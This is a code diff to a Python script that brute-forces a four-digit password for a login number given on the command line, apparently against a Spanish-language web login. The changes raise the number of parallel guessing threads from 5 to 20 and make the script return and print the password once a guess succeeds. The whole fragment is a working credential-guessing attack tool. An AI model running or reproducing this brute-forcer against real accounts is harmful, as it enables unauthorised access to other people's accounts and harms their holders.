@@ -36,13 +36,16 @@ def login(loginNumber, password):
             retry -= 1
             debug("Retry %d" % retry)
         else:
-            return """Los datos ingresados son correctos.""" in html
+            if """Los datos ingresados son correctos""" in html:
+                return password
+            else:
+                return False
 
 
 def main():
     loginNumber = sys.argv[1]
 
-    threads = 5
+    threads = 20
     pause = .1
     slots = [None] * threads
     for password in ("%04d" % n for n in xrange(10000)):
@@ -56,7 +59,7 @@ def main():
                     passed = True
                 elif not slots[pos].is_alive():
                     if slots[pos].result:
-                        print slots[pos].args
+                        print "¡La contraseña es %s!" % slots[pos].result
                         return True
                     passed = True
                 if passed:
